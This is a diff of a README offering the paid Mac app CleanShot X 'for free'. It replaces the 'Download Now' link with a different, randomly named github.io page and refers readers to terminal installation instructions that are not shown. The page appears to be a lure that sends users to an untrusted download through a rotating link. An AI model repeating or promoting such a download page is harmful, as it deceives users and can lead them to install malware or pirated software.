@@ -3,7 +3,7 @@
 
 Capture, annotate, and share your screen effortlessly with CleanShot X. Follow the instructions below to install this powerful screenshot and screen recording tool on your Mac for free.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://fituganshfgh.github.io/.github/cleanshotx)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/cleanshotx)
 
 If the download button doesn’t work, follow the terminal installation instructions below.
 
